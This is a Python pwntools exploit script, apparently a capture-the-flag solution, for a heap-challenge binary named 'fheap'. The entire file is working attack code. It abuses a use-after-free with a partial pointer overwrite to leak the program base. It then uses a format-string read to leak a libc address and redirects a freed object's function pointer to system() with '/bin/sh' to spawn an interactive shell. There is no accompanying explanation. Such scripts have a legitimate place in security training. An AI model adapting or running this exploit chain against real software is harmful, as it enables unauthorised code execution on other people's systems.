#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./fheap"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("3.quit\n",str(idx))

def add(length,content):
    opt("create ")
    p.sendlineafter("Pls give string size:",str(length))
    p.sendafter("str:",str(content))

def free(idx):
    opt("delete ")
    p.sendlineafter("id:",str(idx))
    p.sendlineafter("Are you sure?:",str("yes"))


add(0x10,"a"*0x10)
add(0x10,"b"*0x10)
free(1)
free(0)

payload = flat([
    "a"*0x18,
    p8(0xe4)
    ])
add(0x20,payload)

free(1)
p.recvuntil("a"*0x18)
code_base = u64(p.recv(6).ljust(8,"\0")) - 0xde4
success("code_base addr is -> "+ hex(code_base))
p.sendlineafter("sure?:","no")

free(0)
printf_plt = code_base + elf.plt["printf"]
success("printf_plt addr is -> "+ hex(printf_plt))

add(0x20,"%37$p".ljust(0x18,"b") + p8(0xd0) + p8(0x49))
free(1)

libc.address = int(p.recv(14),16) - 0x6f80a
system_addr = libc.sym["system"]
success("system_addr is " + hex(system_addr))

free(0)

payload = "/bin/sh;".ljust(0x18,"x") + p64(system_addr)
add(0x20,payload)
free(1)

# gdb.attach(p,"set $h=0x555555757000,$g=0x5555557560c0\nb *0x5555555549d0")

p.interactive()
